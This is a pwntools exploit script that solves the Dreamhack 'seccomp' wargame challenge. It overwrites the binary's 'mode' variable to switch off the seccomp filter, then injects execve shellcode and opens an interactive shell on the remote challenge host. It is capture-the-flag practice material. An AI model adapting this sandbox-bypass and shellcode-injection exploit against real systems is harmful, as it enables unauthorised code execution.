from pwn import *

context.arch = 'amd64'
#p = process('seccomp')
p = remote('host1.dreamhack.games', 11859)
elf = ELF('seccomp')
addr_mode = elf.symbols['mode']

p.sendlineafter('> ', '3')
p.sendlineafter(': ', str(addr_mode))
p.sendlineafter(': ', str(-1))
p.sendlineafter('> ', '1')
shellcode = asm(shellcraft.sh())
p.sendlineafter(': ', shellcode)
p.sendlineafter('> ', '2')
p.interactive()

